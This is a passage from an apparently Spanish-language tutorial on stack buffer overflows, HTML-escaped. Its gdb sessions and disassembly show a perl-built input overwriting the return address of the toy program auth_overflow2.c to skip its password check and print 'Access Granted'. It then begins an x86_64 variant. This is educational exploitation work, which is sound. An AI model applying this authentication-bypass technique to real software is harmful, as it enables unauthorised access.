Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;quot;/lib/tls/i686/cmov/libthread_db.so.1&amp;quot;&lt;/span&gt;.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 9
Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow2.c, line 9.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 16
Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow2.c, line 16.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/hkr/booksrc/auth_overflow2.c.binary
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow2.c:9
&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
0xbffff7e0:
&lt;span class=&#34;s2&#34;&gt;&amp;quot;�o������b����o���G���20205�04bb����204�04b�����20205�04bh��������02&amp;quot;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000      0xb7fd6ff4      0xbffff8a0      0xbffff808
0xbffff7ec:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff808
0xbffff7fc:     0x080484bb      0xbffff9f8      0x08048510      0xbffff868
0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow2.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
0xbffff7e0:      &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    0x41414141      0x41414141      0x41414141
0xbffff7ec:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7fc:     0x08004141      0xbffff9f8      0x08048510      0xbffff868
0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Al examinar &lt;em&gt;x/16xw &amp;auth;_flag&lt;/em&gt; podemos ver que en 0xbffff7fc está almacenada la dirección de retorno (0x080484bb), la cual sobrescribimos al desbordar el buffer como se vé en la salida de &lt;em&gt;x/16xw &amp;auth;_flag&lt;/em&gt; tras ejecutar la instrucción &lt;em&gt;strcpy(password_buffer, password);&lt;/em&gt; y almacenar una contraseña demasiado grande en un array demasiado pequeño&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000      0x41414141      0x41414141      0x41414141
0xbffff7ec:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7fc:     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x08004141&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    0xbffff9f8      0x08048510      0xbffff868
0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Entre paréntesis se observa cómo ha quedado machacada la dirección de retorno, con lo cual EIP intentará ejecutar la instrucción que haya en esa dirección aleatoria, provocando el fallo de segmentación.&lt;/p&gt;

&lt;p&gt;¿Cómo podemos conseguir saltarnos la comprobación de la contraseña y que siempre nos de acceso?&lt;/p&gt;

&lt;p&gt;Tenemos que sobrescribir la dirección de retorno con una dirección que nos convenga, veamos de nuevo la porción del main en ensamblador que nos interesa:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x8048414&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;test&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bd&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;je&lt;/span&gt;     &lt;span class=&#34;mh&#34;&gt;0x80484e5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bf&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x80485fb&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484c6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484cb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048619&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d2&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d7&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048630&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484de&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;jmp&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;0x80484f1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e5&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x804864d&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ec&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Esta porción de código corresponde a:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;n-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;      Acceso concedido.n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;nAcceso denegado.n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Las instrucciones del tipo &lt;em&gt;mov DWORD PTR [esp], 0x&amp;#8230;&amp;#8230;&lt;/em&gt; son los argumentos para la función &lt;em&gt;printf&lt;/em&gt;, inmediatamente despues da cada una de estas instrucciones se llama a la función con &lt;code&gt;call 0x804831c &amp;lt;printf&amp;gt;&lt;/code&gt;. Las intrucciones que comienzan con una j son saltos condicionales (je = jump if equal), y jmp es incodicional, es decir, sigue la ejecución por la dirección indicada si o sí, sin evaluar ninguna condición. Observando un poco, nos damos cuenta que nos interesa sustituir la dirección de retorno para que se ejecute esta instrucción &lt;code&gt;0x080484bf &amp;lt;main&amp;gt;: mov DWORD PTR [esp],0x80485fb&lt;/code&gt;, que corresponde con el primer printf. Y así saltarnos la comprobación del if.&lt;/p&gt;

&lt;p&gt;Para conseguir sustituir la dirección de retorno por la que nos interesa, vamos a desbordar el buffer con el valor de dicha dirección:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;gdb -q auth_overflow2.c.binary
Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;quot;/lib/tls/i686/cmov/libthread_db.so.1&amp;quot;&lt;/span&gt;.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 9
Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow2.c, line 9.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 16
Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow2.c, line 16.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;quot;xbfx84x04x08&amp;quot;&amp;#39;&lt;/span&gt;x8&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
Starting program: /home/hkr/booksrc/auth_overflow2.c.binary &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e
&lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;quot;xbfx84x04x08&amp;quot;&amp;#39;&lt;/span&gt;x8&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;

Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f6
&lt;span class=&#34;s2&#34;&gt;&amp;quot;�204�04b�204�04b�204�04b�204�04b�204�04b�204�04b�204�04b�204�04b&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
at auth_overflow2.c:9
&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16x &lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;sp
0xbffff7c0:     0x00000000      0x08049744      0xbffff7d8      0x080482d9
0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x00000000
0xbffff7e0:     0xb7fd6ff4      0xbffff8a0      0xbffff808      0xb7fd6ff4
0xbffff7f0:     0xb7ff47b0      0x08048510      0xbffff808      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x080484bb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff900
&lt;span class=&#34;s2&#34;&gt;&amp;quot;��������I���i���v���230�������&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow2.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16x &lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;sp
0xbffff7c0:     0xbffff7e0      0x080485dc      0xbffff7d8      0x080482d9
0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x00000000
0xbffff7e0:     0x080484bf      0x080484bf      0x080484bf      0x080484bf
0xbffff7f0:     0x080484bf      0x080484bf      0x080484bf      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x080484bf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
      Access Granted.
-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-

Program received signal SIGSEGV, Segmentation fault.
0xe8080485 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Experimentando un poco con gdb se descubre que repetir la dirección 8 veces es suficiente para sobrescribir la dirección de retorno original. El comando &lt;em&gt;$(perl -e &amp;#8216;print &amp;#8220;xbfx84x04x08&amp;#8243;&amp;#8216;x8)&lt;/em&gt; repite la dirección 8 veces, el motivo por el que hay que escribir la dirección al revés es porque internamente se almacenan las direcciones en &lt;a href=&#34;http://es.wikipedia.org/wiki/Endianness&#34; target=&#34;_blank&#34;&gt;little endian&lt;/a&gt;. En los resultados de arriba se puede ver cómo se sutituye la dirección de retorno 0x080484bb(entre paréntesis), por la deseada, 0x080484bf.&lt;/p&gt;

&lt;h1 id=&#34;en-arquitecturas-x86-64&#34;&gt;En arquitecturas x86_64&lt;/h1&gt;

&lt;p&gt;Si tenemos un procesador de 64-bits, el proceso es similar, aunque con gdb debemos usar la opción &lt;em&gt;g&lt;/em&gt; junto al comando examine para que se muestren las direcciones enteras:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 9
Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x40064f: file auth_overflow2.c, line 9.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 16
Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x40069a: file auth_overflow2.c, line 16.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;quot;xeex06x40x00x00x00x00x00&amp;quot;x10&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
Starting program: /home/hkr/hack/auth_overflow2.c.binary &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;quot;xeex06x40x00x00x00x00x00&amp;quot;x10&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;

Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7fffffffe74b &lt;span class=&#34;s2&#34;&gt;&amp;quot;356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@356�06@&amp;quot;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at auth_overflow2.c:9
&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;     strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
